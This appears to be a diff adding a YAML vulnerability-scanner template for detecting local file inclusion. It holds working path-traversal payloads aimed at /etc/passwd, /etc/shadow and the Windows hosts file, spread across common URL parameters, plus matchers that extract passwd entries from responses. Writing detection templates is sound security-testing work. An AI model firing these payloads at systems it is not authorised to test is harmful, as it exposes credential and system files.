@@ -1,0 +1,49 @@
+# Basic LFI Detection Module
+
+id: lfi-basic
+info:
+  name: Basic LFI Detection
+  author: sif
+  severity: high
+  description: Detects basic Local File Inclusion vulnerabilities
+  tags: [lfi, injection, file-inclusion, owasp-top10]
+
+type: http
+
+http:
+  method: GET
+  paths:
+    - "{{BaseURL}}/?file={{payload}}"
+    - "{{BaseURL}}/?page={{payload}}"
+    - "{{BaseURL}}/?path={{payload}}"
+    - "{{BaseURL}}/?include={{payload}}"
+    - "{{BaseURL}}/?doc={{payload}}"
+    - "{{BaseURL}}/?template={{payload}}"
+
+  payloads:
+    - "../../../../../../../etc/passwd"
+    - "....//....//....//....//....//etc/passwd"
+    - "..%2f..%2f..%2f..%2f..%2fetc/passwd"
+    - "/etc/passwd"
+    - "../../../../../../../etc/shadow"
+    - "../../../../../../../windows/system32/drivers/etc/hosts"
+
+  threads: 10
+
+  matchers:
+    - type: regex
+      part: body
+      regex:
+        - "root:.*:0:0:"
+        - "daemon:.*:1:1:"
+        - "nobody:.*:65534:"
+        - "127\\.0\\.0\\.1\\s+localhost"
+      condition: or
+
+  extractors:
+    - type: regex
+      name: detected_file
+      part: body
+      regex:
+        - "(root|daemon|nobody):.*:[0-9]+:[0-9]+:"
+      group: 0
